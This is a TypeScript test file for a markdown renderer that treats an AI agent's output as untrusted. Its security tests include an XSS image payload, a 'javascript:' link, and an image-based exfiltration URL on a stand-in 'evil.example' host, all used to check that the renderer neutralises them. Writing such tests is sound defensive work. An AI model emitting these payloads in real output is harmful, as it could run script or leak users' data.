import { describe, expect, it } from 'vitest';

import { parseInline, parseMarkdown } from './markdown.ts';
import { toolLabel, toolSummary } from './tools.ts';

describe('parseMarkdown', () => {
  it('reads the blocks an agent writes', () => {
    const blocks = parseMarkdown(
      ['## Result', '', 'It **worked**, see `out.txt`.', '', '- one', '- two', '  - nested', '', '1. first', '2. second', '', '> quoted', '', '---'].join('\n')
    );
    expect(blocks.map((b) => b.type)).toEqual(['heading', 'paragraph', 'list', 'list', 'quote', 'rule']);
    expect(blocks[2]).toMatchObject({ type: 'list', ordered: false, items: [[{ type: 'paragraph' }], [{ type: 'paragraph' }, { type: 'list' }]] });
    expect(blocks[3]).toMatchObject({ type: 'list', ordered: true, start: 1 });
  });

  it('reads a table, with its alignment', () => {
    const [table] = parseMarkdown('| name | size |\n|:--|--:|\n| a | 1 |\n| b | 22 |');
    expect(table).toMatchObject({ type: 'table', align: ['left', 'right'], rows: [[[{ text: 'a' }], [{ text: '1' }]], [[{ text: 'b' }], [{ text: '22' }]]] });
  });

  it('keeps a code fence that is still streaming open to the end', () => {
    expect(parseMarkdown('Here:\n```ts\nconst a = 1;\nconst b')).toEqual([
      { type: 'paragraph', children: [{ type: 'text', text: 'Here:' }] },
      { type: 'code', lang: 'ts', text: 'const a = 1;\nconst b', open: true }
    ]);
    expect(parseMarkdown('```\nx\n```')).toEqual([{ type: 'code', lang: '', text: 'x', open: false }]);
  });

  it('leaves half-written emphasis as text', () => {
    expect(parseInline('a **bold')).toEqual([{ type: 'text', text: 'a **bold' }]);
  });
});

describe('parseInline: the agent is untrusted', () => {
  it('keeps HTML as text', () => {
    expect(parseInline('<img src=x onerror=alert(1)><b>hi</b>')).toEqual([{ type: 'text', text: '<img src=x onerror=alert(1)><b>hi</b>' }]);
  });

  it('keeps only https and mailto links', () => {
    expect(parseInline('[ok](https://a.example/x)')).toEqual([{ type: 'link', href: 'https://a.example/x', children: [{ type: 'text', text: 'ok' }] }]);
    expect(parseInline('[bad](javascript:alert(1))').some((n) => n.type === 'link')).toBe(false);
    expect(parseInline('[plain](http://a.example)')[0]).toEqual({ type: 'text', text: 'plain' });
    expect(parseInline('[me](mailto:a@b.c)')[0]).toMatchObject({ type: 'link', href: 'mailto:a@b.c' });
  });

  it('never makes an image: it becomes a link that needs a click', () => {
    expect(parseInline('![chart](https://evil.example/leak?d=secret)')).toEqual([
      { type: 'link', href: 'https://evil.example/leak?d=secret', children: [{ type: 'text', text: 'chart' }] }
    ]);
  });

  it('links bare https URLs, without the punctuation after them', () => {
    expect(parseInline('See https://a.example/p.')).toEqual([
      { type: 'text', text: 'See ' },
      { type: 'link', href: 'https://a.example/p', children: [{ type: 'text', text: 'https://a.example/p' }] },
      { type: 'text', text: '.' }
    ]);
  });

  it('reads inline styles, nested', () => {
    expect(parseInline('**bold _and em_** ~~gone~~ `a*b*c`')).toEqual([
      { type: 'strong', children: [{ type: 'text', text: 'bold ' }, { type: 'em', children: [{ type: 'text', text: 'and em' }] }] },
      { type: 'text', text: ' ' },
      { type: 'del', children: [{ type: 'text', text: 'gone' }] },
      { type: 'text', text: ' ' },
      { type: 'code', text: 'a*b*c' }
    ]);
  });
});

describe('tools', () => {
  it('names MCP tools by server and tool', () => {
    expect(toolLabel('mcp__calendar__list_events')).toBe('calendar · list_events');
    expect(toolLabel('Bash')).toBe('Bash');
  });

  it('summarises a call by the argument people recognise it by', () => {
    expect(toolSummary('{"command":"ls -la","description":"List"}')).toBe('ls -la');
    expect(toolSummary('{"file_path":"/tmp/a.txt"}')).toBe('/tmp/a.txt');
    expect(toolSummary('{"comm')).toBe('');
  });
});
